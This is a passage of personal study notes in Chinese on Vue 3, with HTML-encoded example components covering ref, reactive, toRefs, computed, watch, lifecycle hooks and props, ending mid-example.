注意：setup里面没有beforecreate和created两个，最早的是onMounted这个钩子 单值变量 ref()&#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-05-31 17:22:40 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-05-31 17:27:05 *&#x2F; &lt;template&gt; &lt;h1&gt;&#123;&#123; msg &#125;&#125;&lt;&#x2F;h1&gt; &lt;!-- &lt;button @click&#x3D;&quot;count++&quot;&gt;count is: &#123;&#123; count &#125;&#125;&lt;&#x2F;button&gt; --&gt; &lt;p&gt; Edit &lt;code&gt;components&#x2F;HelloWorld.vue&lt;&#x2F;code&gt; to test hot module replacement. &lt;&#x2F;p&gt; &lt;p&gt;&#123;&#123; msg2 &#125;&#125;&lt;&#x2F;p&gt; &lt;&#x2F;template&gt; &lt;script&gt; import &#123; ref &#125; from &quot;@vue&#x2F;reactivity&quot;; export default &#123; name: &quot;HelloWorld&quot;, props: &#123; msg: String, &#125;, &#x2F;&#x2F; data() &#123; &#x2F;&#x2F; return &#123; &#x2F;&#x2F; count: 0, &#x2F;&#x2F; &#125;; &#x2F;&#x2F; &#125;, setup() &#123; const msg2 &#x3D; ref(&#39;some massage&#39;); return &#123; msg2 &#125;; &#125;, &#125;; &lt;&#x2F;script&gt; 还可以将整个counter的部分提出来 &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-05-31 17:22:40 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-05-31 17:27:05 *&#x2F; &lt;template&gt; &lt;h1&gt;&#123;&#123; msg &#125;&#125;&lt;&#x2F;h1&gt; &lt;!-- &lt;button @click&#x3D;&quot;count++&quot;&gt;count is: &#123;&#123; count &#125;&#125;&lt;&#x2F;button&gt; --&gt; &lt;p&gt; Edit &lt;code&gt;components&#x2F;HelloWorld.vue&lt;&#x2F;code&gt; to test hot module replacement. &lt;&#x2F;p&gt; &lt;p&gt;&#123;&#123; data.counter &#125;&#125;&lt;&#x2F;p&gt; &lt;p&gt;&#123;&#123; data.doublecounter &#125;&#125;&lt;&#x2F;p&gt; &lt;&#x2F;template&gt; &lt;script&gt; import &#123; reactive, computed, ref &#125; from &quot;@vue&#x2F;reactivity&quot;; export default &#123; name: &quot;HelloWorld&quot;, props: &#123; msg: String, &#125;, setup() &#123; const data &#x3D; userCounter() return &#123; data &#125;; &#125;, &#125;; function userCounter() &#123; const data &#x3D; reactive(&#123; counter: 1, doublecounter: computed(() &#x3D;&gt; data.counter * 2), &#125;); return data &#125; &lt;&#x2F;script&gt; 导出的data可以解构出来，就不用在页面上使用多个data. &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-05-31 17:22:40 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-05-31 17:27:05 *&#x2F; &lt;template&gt; &lt;h1&gt;&#123;&#123; msg &#125;&#125;&lt;&#x2F;h1&gt; &lt;!-- &lt;button @click&#x3D;&quot;count++&quot;&gt;count is: &#123;&#123; count &#125;&#125;&lt;&#x2F;button&gt; --&gt; &lt;p&gt; Edit &lt;code&gt;components&#x2F;HelloWorld.vue&lt;&#x2F;code&gt; to test hot module replacement. &lt;&#x2F;p&gt; &lt;p&gt;&#123;&#123; counter &#125;&#125;&lt;&#x2F;p&gt; &lt;p&gt;&#123;&#123; doublecounter &#125;&#125;&lt;&#x2F;p&gt; &lt;&#x2F;template&gt; &lt;script&gt; import &#123; reactive, computed, ref ,toRefs&#125; from &quot;@vue&#x2F;reactivity&quot;; export default &#123; name: &quot;HelloWorld&quot;, props: &#123; msg: String, &#125;, setup() &#123; const &#123; counter,doublecounter &#125; &#x3D; userCounter() return &#123; counter,doublecounter &#125;; &#125;, &#125;; function userCounter() &#123; const data &#x3D; reactive(&#123; counter: 1, doublecounter: computed(() &#x3D;&gt; data.counter * 2), &#125;); return toRefs(data) &#125; &lt;&#x2F;script&gt; 元素引用通过给元素制定属性，如 &lt;p ref&#x3D;&quot;desc&quot;&gt;&lt;&#x2F;p&gt; 再用单值定义为null，该单值就可以作为元素 &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-05-31 17:22:40 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-05-31 17:27:05 *&#x2F; &lt;template&gt; &lt;p ref&#x3D;&quot;desc&quot;&gt;&lt;&#x2F;p&gt; &lt;&#x2F;template&gt; &lt;script&gt; import &#123; reactive, computed, ref, toRefs &#125; from &quot;@vue&#x2F;reactivity&quot;; export default &#123; name: &quot;HelloWorld&quot;, props: &#123; msg: String, &#125;, setup() &#123; &#x2F;&#x2F; 元素引用 const desc &#x3D; ref(null); return &#123; desc &#125;; &#125;, &#125;; &lt;&#x2F;script&gt; 此时desc可操作元素 如通过输入框改变变量值，在监听该变量，变量改变就使p的内容也改变 Teleport制定内容的父元素 a.vue &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-05-31 17:22:40 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-05-31 17:27:05 *&#x2F; &lt;template&gt; &lt;!-- teleprot --&gt; &lt;modalButton&gt;&lt;&#x2F;modalButton&gt; &lt;&#x2F;template&gt; &lt;script&gt; import modalButton from &#39;.&#x2F;modalButton.vue&#39; export default &#123; name: &quot;HelloWorld&quot;, components: &#123; modalButton &#125;, props: &#123; msg: String, &#125;, setup() &#123; &#125;, &#125;; &lt;&#x2F;script&gt; b.vue &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-05-31 17:22:40 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-05-31 17:27:05 *&#x2F; &lt;template&gt; &lt;div&gt; &lt;button @click&#x3D;&quot;modalOpen &#x3D; true&quot;&gt;弹出&lt;&#x2F;button&gt; &lt;teleport to&#x3D;&quot;body&quot;&gt; &lt;div v-if&#x3D;&quot;modalOpen&quot;&gt; &lt;div&gt; kif &lt;button @click&#x3D;&quot;modalOpen &#x3D; false&quot;&gt;关闭&lt;&#x2F;button&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;teleport&gt; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;script&gt; export default &#123; props: &#123;&#125;, components: &#123;&#125;, data() &#123; return &#123; modalOpen: false &#125;; &#125;, methods: &#123;&#125;, &#125;; &lt;&#x2F;script&gt; &lt;style lang&#x3D;&quot;less&quot; scoped&gt; &lt;&#x2F;style&gt; &lt;teleport to&#x3D;&quot;body&quot;&gt; 指定弹出框父级元素为body Emits Components Option值得注意的新特性Vue 3 中一些需要关注的新功能包括： 组合式 API Teleport 片段 触发组件选项 来自 @vue/runtime-core 的 createRenderer API，用于创建自定义渲染器 单文件组件组合式 API 语法糖 (&#96;&#96;) 单文件组件状态驱动的 CSS 变量 (&#96;&#96; 中的 v-bind) SFC &#96;&#96; 现在可以包含全局规则或只针对插槽内容的规则 Suspense 重写双向绑定vue2基于Object.defineProperty()实现 Vue3基于Proxy（ES6新增）实现 优势： 丢掉麻烦的备份数据 省去for in循环 可以监听到数组变化（包括push等操作） 优化Vdomvue2中，每次更新diff，都是全量对比，性能消耗大， vue3，只对比带有标记的内容 图中标记item 1 text fragmentvue3允许多个template根节点 Tree shaking保持项目结果不变的条件下，去除无用的代码 vue指令补充&lt;div class&#x3D;&quot;kif&quot; @click&#x3D;&quot;parend&quot;&gt; &lt;div class&#x3D;&quot;text&quot; v-if&#x3D;&quot;flag&quot; v-text&#x3D;&quot;message&quot;&gt;&lt;&#x2F;div&gt; &lt;button @click.stop&#x3D;&quot;fun2&quot;&gt;on&lt;&#x2F;button&gt; &lt;&#x2F;div&gt; @click.stop阻止冒泡 @click.prevent 阻止事件的默认行为， @keyup.enter 3.ref3.1 ref用途： 接受一个参数值并返回一个响应式且可改变的 ref 对象。ref 对象拥有一个指向内部值的单一属性 .value。实现修改ref.value页面响应式变化 导入： import &#123; ref&#125; from 'vue' &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-05-31 17:22:40 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-05-31 17:27:05 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import &#123; ref &#125; from &#39;vue&#39; let count &#x3D; ref(0) let change &#x3D; () &#x3D;&gt; &#123; count.value++ console.log(count) &#125; &lt;&#x2F;script&gt; &lt;template&gt; &lt;h1&gt;&#123;&#123; count &#125;&#125;&lt;&#x2F;h1&gt; &lt;button @click&#x3D;&quot;change&quot;&gt; change&lt;&#x2F;button&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; Ref ts中用来定义变量类型 import &#123; ref,Ref &#125; from 'vue' let count:Ref&lt;number> = ref(0) 3.2 isref用途：判断是否是一个REF对象 导入： import &#123; ref,isRef &#125; from 'vue' /* * @Author: kif kif101001000@163.com * @Date: 2022-05-31 17:22:40 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-05-31 17:27:05 */ import &#123; ref,isRef,Ref &#125; from 'vue' defineProps&lt;&#123; msg: string &#125;>() let count:Ref&lt;number> = ref(0) let s:string='kif' console.log(isRef(s)) //false console.log(isRef(count))//true 3.3 shallowRef，triggerRef用途:配合使用形成响应式引用数据类型 导入： &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-05-31 17:22:40 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-05-31 17:27:05 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import &#123;shallowRef,triggerRef &#125; from &#39;vue&#39; let obj &#x3D;&#123; name:&#39;kif&#39;, age:12 &#125; let objRef &#x3D; shallowRef(obj) let change2&#x3D;()&#x3D;&gt;&#123; objRef.value.age&#x3D;34 console.log(objRef) &#125; &lt;&#x2F;script&gt; &lt;template&gt; &lt;p&gt;&#123;&#123;objRef&#125;&#125;&lt;&#x2F;p&gt; &lt;button @click&#x3D;&quot;change2&quot;&gt;change2&lt;&#x2F;button&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; ![image-20220531152451508](E:\\kifFile\\study\\Vue3 + vite + Ts + pinia + 实战 + 源码 +全栈\\Vue3学习笔记.assets\\image-20220531152451508.png) 仅仅使用shallowRef无法实现对对象属性的响应式改变（objRef.value.age&#x3D;34），可以使用的解决办法： 改变整个value objRef.value=&#123; name:'kif', age:45 &#125; triggerRef强制更新视图 objRef.value.age=45 triggerRef(objRef) 3.4 customRef自定义Ref 有点难，先不学，嘿嘿嘿 4.reactive4.1 reactive用途：接收一个普通对象然后返回该普通对象的响应式代理。等同于 2.x 的 Vue.observable() 接受复杂数据类型，如数组，对象 ps：前面ref在接受复杂数据类型后内部处理其实是用的reactive 导入： import &#123; reactive &#125; from 'vue'; /* * @Author: kif kif101001000@163.com * @Date: 2022-05-31 17:22:40 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-05-31 17:27:05 */ &lt;script setup lang=\"ts\"> import &#123; reactive &#125; from 'vue'; let obj= reactive(&#123; msg:'hello' &#125;) let change=()=>&#123; obj.msg='world' &#125; &lt;/script> &lt;template> &#123;&#123; obj &#125;&#125; &lt;button @click=\"change\">button&lt;/button> &lt;/template> &lt;style scoped> &lt;/style> reactive不用value获取值 注：数组时需要注意！ /* * @Author: kif kif101001000@163.com * @Date: 2022-05-31 17:22:40 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-05-31 17:27:05 */ &lt;script setup lang=\"ts\"> import &#123; reactive &#125; from 'vue'; let arrReactive=reactive([1,2,3]) let change2=()=>&#123; arrReactive[1]=2 &#125; &lt;/script> &lt;template> &#123;&#123; arrReactive &#125;&#125; &lt;button @click=\"change2\">button&lt;/button> &lt;/template> &lt;style scoped> &lt;/style> arrReactive[1]&#x3D;2这种数组操作不能用，只能用push， let change2=()=>&#123; let newArr=[4,5,7,8] arrReactive.push(...newArr) &#125; way2： 创建一个响应式对象，对象的属性是数组 /* * @Author: kif kif101001000@163.com * @Date: 2022-05-31 17:22:40 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-05-31 17:27:05 */ &lt;script setup lang=\"ts\"> import &#123; reactive &#125; from 'vue'; type T = &#123; list: number[] &#125; let obj2: T = reactive&lt;T>(&#123; list: [1, 2, 3] &#125;) let change3 = () => &#123; let newarr = [1, 2, 3, 4, 5, 6, 7] obj2.list = newarr &#125; &lt;/script> &lt;template> &#123;&#123; obj2.list &#125;&#125; &lt;button @click=\"change3\">button&lt;/button> &lt;/template> &lt;style scoped> &lt;/style> 4.2 readonly用途：拷贝一份reactive对象并设置为只读 导入： import &#123; readonly &#125; from 'vue'; /* * @Author: kif kif101001000@163.com * @Date: 2022-05-31 17:22:40 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-05-31 17:27:05 */ &lt;script setup lang=\"ts\"> import &#123; reactive,readonly &#125; from 'vue'; let obj = reactive(&#123; msg: 'hello' &#125;) let change = () => &#123; obj.msg = 'world' &#125; // readonly let copyObj=readonly(obj) copyObj.msg='world' &lt;/script> ![image-20220531155512565](E:\\kifFile\\study\\Vue3 + vite + Ts + pinia + 实战 + 源码 +全栈\\Vue3学习笔记.assets\\image-20220531155512565.png) 4.3 shallowReactive用途：将对象第一层设置为响应式 导入： import &#123;shallowReactive &#125; from 'vue'; /* * @Author: kif kif101001000@163.com * @Date: 2022-05-31 17:22:40 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-05-31 17:27:05 */ &lt;script setup lang=\"ts\"> import &#123; shallowReactive &#125; from 'vue'; let deepObjShall=shallowReactive(&#123; name:'kif', firends:&#123; name:'zm', age:22 &#125; &#125;) let changeS=()=>&#123; deepObjShall.name='kif2' &#125; let changeS2=()=>&#123; deepObjShall.firends.age=11 &#125; //changeS() //changeS2() &lt;/script> &lt;template> &#123;&#123; deepObjShall &#125;&#125; &lt;button @click=\"changeS\">button&lt;/button> &lt;button @click=\"changeS2\">button&lt;/button> &lt;/template> &lt;style scoped> &lt;/style> changeS()changeS2() 这样执行会发现深浅都会变化，正确使用方法是用事件触发 ![image-20220531160403290](E:\\kifFile\\study\\Vue3 + vite + Ts + pinia + 实战 + 源码 +全栈\\Vue3学习笔记.assets\\image-20220531160403290.png) 5.to5.1 toRef用途：将对象某一个属性变成响应式 导入： import &#123; toRef &#125; from 'vue' &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-05-31 17:22:40 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-05-31 17:27:05 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import &#123; toRef &#125; from &#39;vue&#39; let obj &#x3D; &#123; name: &#39;kif&#39;, age: 13 &#125; let tR &#x3D; toRef(obj, &#39;age&#39;) let change &#x3D; () &#x3D;&gt; &#123; tR.value++ console.log(&quot;原&quot;, obj) console.log(&#39;引&#39;, tR) &#125; &lt;&#x2F;script&gt; &lt;template&gt; &lt;!-- &lt;h1&gt;&#123;&#123; msg &#125;&#125;&lt;&#x2F;h1&gt; --&gt; &lt;p&gt;&#123;&#123; tR &#125;&#125;&lt;&#x2F;p&gt; &lt;button @click&#x3D;&quot;change&quot;&gt;dianji&lt;&#x2F;button&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; 点击之后原对象和新对象都会变，而且页面不会响应式刷新 ![image-20220531161211613](E:\\kifFile\\study\\Vue3 + vite + Ts + pinia + 实战 + 源码 +全栈\\Vue3学习笔记.assets\\image-20220531161211613.png) 原对象是响应式就可以响应式变化 即： let obj =reactive( &#123; name: 'kif', age: 13 &#125;) 5.2 torefs用途：对象解构后每个属性变成响应式 导入： import &#123; toRefs &#125; from 'vue' let &#123;name,age&#125; =reactive( &#123; name: 'kif', age: 13 &#125;) 这种解构后的name 和age不是响应式的， &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-05-31 17:22:40 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-05-31 17:27:05 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import &#123; reactive,toRefs &#125; from &#39;vue&#39; let &#123;name,age&#125; &#x3D;toRefs(reactive( &#123; name: &#39;kif&#39;, age: 13 &#125;)) let change2&#x3D;()&#x3D;&gt;&#123; age.value++ &#125; &lt;&#x2F;script&gt; &lt;template&gt; &lt;!-- &lt;h1&gt;&#123;&#123; msg &#125;&#125;&lt;&#x2F;h1&gt; --&gt; &lt;p&gt;&#123;&#123; age &#125;&#125;&lt;&#x2F;p&gt; &lt;button @click&#x3D;&quot;change2&quot;&gt;dianji&lt;&#x2F;button&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; 5.3 toRaw用途：将响应式对象变回普通对象 导入： import &#123; toRew &#125; from 'vue' 6.计算属性 computed用途： 导入： import &#123; computed &#125; from 'vue'; &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-05-31 17:22:40 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-05-31 17:27:05 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import &#123; computed,ref &#125; from &#39;vue&#39;; let firstName &#x3D;ref(&#39;&#39;) let lastName &#x3D;ref(&#39;&#39;) let fullName &#x3D; computed(() &#x3D;&gt; &#123; return &#96;$&#123;firstName.value&#125; $&#123;lastName.value&#125;&#96; &#125;) &#x2F;&#x2F;let fullName2 &#x3D; computed(&#123; &#x2F;&#x2F; set() &#123; &#x2F;&#x2F; firstName.value + lastName.value &#x2F;&#x2F; &#125;, &#x2F;&#x2F; get() &#123; &#x2F;&#x2F; return &#96;$&#123;firstName.value&#125; $&#123;lastName.value&#125;&#96; &#x2F;&#x2F; &#125; &#x2F;&#x2F; &#125;) &lt;&#x2F;script&gt; &lt;template&gt; input:&lt;input v-model&#x3D;&quot;firstName&quot;&#x2F;&gt;&lt;br&#x2F;&gt; input:&lt;input v-model&#x3D;&quot;lastName&quot;&#x2F;&gt;&lt;br&#x2F;&gt; &lt;p&gt;&#123;&#123;fullName&#125;&#125;&lt;&#x2F;p&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; 案例：购物车&#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-05-31 17:22:40 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-05-31 17:27:05 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import &#123; reactive, computed &#125; from &#39;vue&#39;; type goods &#x3D; &#123; name: string, num: number, price: number &#125; let data &#x3D; reactive&lt;goods[]&gt;([ &#123; name: &#39;goods1&#39;, num: 1, price: 12 &#125;, &#123; name: &#39;goods2&#39;, num: 2, price: 13 &#125;, &#123; name: &#39;goods3&#39;, num: 2, price: 14 &#125; ]) let add &#x3D; (index: number) &#x3D;&gt; &#123; data[index].num++ &#125; let reduce &#x3D; (index: number) &#x3D;&gt; &#123; if(data[index].num&gt;0)&#123; data[index].num-- &#125; &#125; let deleteDo &#x3D; (index:number)&#x3D;&gt;&#123; data.splice(index,1) &#125; let sum&#x3D;computed(()&#x3D;&gt;&#123; let sum&#x3D;0 data.forEach(item&#x3D;&gt;&#123; sum+&#x3D;item.num*item.price &#125;) return sum &#125;) &lt;&#x2F;script&gt; &lt;template&gt; &lt;dvi class&#x3D;&quot;main&quot;&gt; &lt;table border style&#x3D;&quot;width:800px&quot;&gt; &lt;thead&gt; &lt;tr align&#x3D;&quot;center&quot;&gt; &lt;th &gt;序号&lt;&#x2F;th&gt; &lt;th&gt;名称&lt;&#x2F;th&gt; &lt;th&gt;数量&lt;&#x2F;th&gt; &lt;th&gt;单价&lt;&#x2F;th&gt; &lt;th&gt;操作&lt;&#x2F;th&gt; &lt;&#x2F;tr&gt; &lt;&#x2F;thead&gt; &lt;tbody&gt; &lt;tr v-for&#x3D;&quot;(item, index) in data&quot;&gt; &lt;td&gt;&#123;&#123; index &#125;&#125;&lt;&#x2F;td&gt; &lt;td&gt;&#123;&#123; item.name &#125;&#125;&lt;&#x2F;td&gt; &lt;td&gt; &lt;button @click&#x3D;&quot;add(index)&quot;&gt;+&lt;&#x2F;button&gt;&#123;&#123; item.num &#125;&#125;&lt;button @click&#x3D;&quot;reduce(index)&quot;&gt;-&lt;&#x2F;button&gt; &lt;&#x2F;td&gt; &lt;td&gt;&#123;&#123; item.price &#125;&#125;&lt;&#x2F;td&gt; &lt;td&gt; &lt;button @click&#x3D;&quot;deleteDo(index)&quot;&gt;delete&lt;&#x2F;button&gt; &lt;&#x2F;td&gt; &lt;&#x2F;tr&gt; &lt;tr&gt; &lt;td&gt;&lt;&#x2F;td&gt; &lt;td&gt;&lt;&#x2F;td&gt; &lt;td&gt;&lt;&#x2F;td&gt; &lt;td&gt;&lt;&#x2F;td&gt; &lt;td&gt;sum:&#123;&#123;sum&#125;&#125;&lt;&#x2F;td&gt; &lt;&#x2F;tr&gt; &lt;&#x2F;tbody&gt; &lt;tfoot&gt;&lt;&#x2F;tfoot&gt; &lt;&#x2F;table&gt; &lt;&#x2F;dvi&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; ![image-20220531171949840](E:\\kifFile\\study\\Vue3 + vite + Ts + pinia + 实战 + 源码 +全栈\\Vue3学习笔记.assets\\image-20220531171949840.png) 7.监听属性 watch导入： import &#123; watch &#125; from 'vue' &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-05-31 17:22:40 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-05-31 17:27:05 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import &#123; watch, ref &#125; from &#39;vue&#39; let me1 &#x3D; ref(&#39;&#39;) let me2 &#x3D; ref(&#39;&#39;) watch([me1,me2], (newVal, oldVal) &#x3D;&gt; &#123; console.log(newVal, oldVal) &#125;) &lt;&#x2F;script&gt; &lt;template&gt; watch &lt;input v-model&#x3D;&quot;me1&quot; &#x2F;&gt; &lt;input v-model&#x3D;&quot;me2&quot; &#x2F;&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; 深度监听： watch(obj, (newVal, oldVal) => &#123; console.log(newVal, oldVal) &#125;,&#123; deep:true &#125;) 高级监听器 watchEffect &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-05-31 17:22:40 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-05-31 18:09:58 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import &#123; ref,watchEffect &#125; from &#39;vue&#39; let messag2&#x3D;ref(&#39;&#39;) watchEffect(()&#x3D;&gt;&#123; console.log(messag2.value) &#125;) &lt;&#x2F;script&gt; &lt;template&gt; watch &lt;input v-model&#x3D;&quot;messag2&quot; &#x2F;&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; watchEffect(()&#x3D;&gt;{ console.log(messag2.value)}) 可以传入一个回调函数作为参数，这个回调函数会在里面代码优先执行 &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-05-31 17:22:40 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-05-31 18:13:05 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import &#123; watch, ref, reactive, watchEffect &#125; from &#39;vue&#39; let messag2 &#x3D; ref(&#39;&#39;) watchEffect((fun) &#x3D;&gt; &#123; console.log(messag2.value) fun(() &#x3D;&gt; &#123; console.log(&#39;before&#39;) &#125;) &#125;) &lt;&#x2F;script&gt; &lt;template&gt; watch &lt;input v-model&#x3D;&quot;messag2&quot; &#x2F;&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; ![image-20220531181339899](E:\\kifFile\\study\\Vue3 + vite + Ts + pinia + 实战 + 源码 +全栈\\Vue3学习笔记.assets\\image-20220531181339899.png) 其返回值是一个函数，执行即可停止监听 let stop &#x3D; watchEffect((fun) &#x3D;&gt; &#123; console.log(messag2.value) fun(() &#x3D;&gt; &#123; console.log(&#39;before&#39;) &#125;) &#125;) stop() 8.组件和生命周期8.1组件每一个.vue文件即为一个组件，通过在script里面 import x from '' 引入，组件可以复用，但引入名不能和html原标签名相同。 8.2组件生命周期8.2.1 onBrforeMount挂载之前 此时无法获取到dom元素 &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-06-01 09:53:54 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-06-01 09:53:54 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import &#123; onBeforeMount &#125; from &#39;vue&#39; console.log(&#39;正常&#39;)&#x2F;&#x2F;正常 onBeforeMount(() &#x3D;&gt; &#123; let div &#x3D; document.getElementsByClassName(&#39;main&#39;)[0] console.log(div)&#x2F;&#x2F;undefined console.log(&#39;onBeforeMount&#39;)&#x2F;&#x2F;onBeforeMount &#125;) &lt;&#x2F;script&gt; &lt;template&gt; &lt;div class&#x3D;&quot;main&quot;&gt;k&lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; ![image-20220601095438896](E:\\kifFile\\study\\Vue3 + vite + Ts + pinia + 实战 + 源码 +全栈\\Vue3学习笔记.assets\\image-20220601095438896.png) 8.2.2 onMounted挂载之后，可以拿到dom元素 &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-06-01 09:53:54 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-06-01 09:56:46 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import &#123; onBeforeMount,onMounted &#125; from &#39;vue&#39; console.log(&#39;正常&#39;) onBeforeMount(() &#x3D;&gt; &#123; let div &#x3D; document.getElementsByClassName(&#39;main&#39;)[0] console.log(div) console.log(&#39;onBeforeMount&#39;) &#125;) onMounted(()&#x3D;&gt;&#123; let div &#x3D; document.getElementsByClassName(&#39;main&#39;)[0] console.log(div) console.log(&#39;onMounted&#39;) &#125;) &lt;&#x2F;script&gt; &lt;template&gt; &lt;div class&#x3D;&quot;main&quot;&gt;k&lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; ![image-20220601095716241](E:\\kifFile\\study\\Vue3 + vite + Ts + pinia + 实战 + 源码 +全栈\\Vue3学习笔记.assets\\image-20220601095716241.png) 8.2.3 onBeforeUpdate更新之前 8.2.4 onUpdated更新之后 8.2.5 onbeforeUnmount卸载之前 8.2.6 onUnmount卸载完成 v-if 会触发卸载加载事件，可以用来演示 9.组件传值案例：常规页面布局layout.vue: &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import Menu from &#39;.&#x2F;menu&#x2F;index.vue&#39; import Content from &#39;.&#x2F;content&#x2F;index.vue&#39; import Header from &#39;.&#x2F;header&#x2F;index.vue&#39; &lt;&#x2F;script&gt; &lt;template&gt; &lt;div class&#x3D;&quot;main&quot;&gt; &lt;Menu&gt;&lt;&#x2F;Menu&gt; &lt;div class&#x3D;&quot;main-right&quot;&gt; &lt;Header&gt;&lt;&#x2F;Header&gt; &lt;Content&gt;&lt;&#x2F;Content&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;style lang&#x3D;&quot;less&quot; scoped&gt; .main &#123; display: flex; overflow: hidden; .menu &#123; width: 200px; &#125; &amp;-right &#123; flex: 1; border: 1px solid blue; display: flex; flex-direction: column; &#125; &#125; &lt;&#x2F;style&gt; content.vue &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import &#123; ref &#125; from &#39;vue&#39; &lt;&#x2F;script&gt; &lt;template&gt; &lt;div class&#x3D;&quot;content&quot;&gt; content &lt;div class&#x3D;&quot;list&quot; v-for&#x3D;&quot;item in 100&quot; :key&#x3D;&quot;item&quot;&gt; &#123;&#123; item &#125;&#125; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; .content &#123; &#x2F;* height: 100px; *&#x2F; flex: 1; overflow: auto; border: 2px solid green; padding: 20px; &#125; &lt;&#x2F;style&gt; header.vue &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import &#123; ref &#125; from &#39;vue&#39; &lt;&#x2F;script&gt; &lt;template&gt; &lt;div class&#x3D;&quot;header&quot;&gt; header &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; .header&#123; &#x2F;* flex:1 *&#x2F; height:100px &#125; &lt;&#x2F;style&gt; menu.vue &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import Menu from &#39;.&#x2F;menu&#x2F;index.vue&#39; import Content from &#39;.&#x2F;content&#x2F;index.vue&#39; import Header from &#39;.&#x2F;header&#x2F;index.vue&#39; &lt;&#x2F;script&gt; &lt;template&gt; &lt;div class&#x3D;&quot;main&quot;&gt; &lt;Menu&gt;&lt;&#x2F;Menu&gt; &lt;div class&#x3D;&quot;main-right&quot;&gt; &lt;Header&gt;&lt;&#x2F;Header&gt; &lt;Content&gt;&lt;&#x2F;Content&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;style lang&#x3D;&quot;less&quot; scoped&gt; .main &#123; display: flex; overflow: hidden; .menu &#123; width: 200px; &#125; &amp;-right &#123; flex: 1; border: 1px solid blue; display: flex; flex-direction: column; &#125; &#125; &lt;&#x2F;style&gt; 9.1 defineProps父组件向子组件传值 简单数据类型父组件： &lt;Menu title&#x3D;&quot;this is title&quot;&gt;&lt;&#x2F;Menu&gt; title为参数量名 子组件： &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-06-01 14:03:10 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-06-01 14:03:10 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; type Props &#x3D; &#123; title: string &#125; 